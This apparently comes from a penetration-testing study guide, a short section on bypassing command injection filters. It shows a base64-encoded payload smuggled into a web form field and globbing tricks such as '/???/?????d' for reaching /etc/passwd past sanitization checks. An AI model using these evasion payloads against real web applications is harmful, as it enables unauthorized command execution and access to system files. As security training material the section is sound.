# Bypassing Command Injection Restrictions
**Chapter** 6 &nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp; **Page**: 139

To prevent Command Injection Attacks, developers often implement sanitization checks.<br>
You may get lucky where some operators aren't blocked (e.g. ";" blocked but "|" works).<br>
Regardless, it's best to ubderstand a few methods to bypass command injection controls.<br>


## Obfuscation and Encoding
Techniques like URL encoding, Base64 encoding, and character encoding can hide a payload<br>
from security controls, checks, and filters.

###### Example: Base64-encode the `ls -l` command and hide payload in input field for */donate.php*.
`| $(echo 'bHMgLWw=' | base64 -d)`

The above payload should return a full filesystem listing for the web app's present working directory.
---

## Globbing
Globbing is the process of using wildcard patterns to fully or partially match filenames or directories.<br>
Wildcards for strings include *?*, *\**, *[*, *]*, or *!*.

Consider the */etc/passwd* file on Linux. We could view it using the *ls* command

###### Specific path and filename:
`ls -l /etc/passwd`

###### Using the *?* wildcard for a single character in filename:
`ls -l /etc/p?sswd`

###### Using multiple *?* in the directory name:
`ls -l /e??/passwd`

###### Extreme globbing with the *?* wildcard:
`ls -l /???/?????d`

###### Globbing with brace expansion:
`ls /??c/{p????d,g???p}`
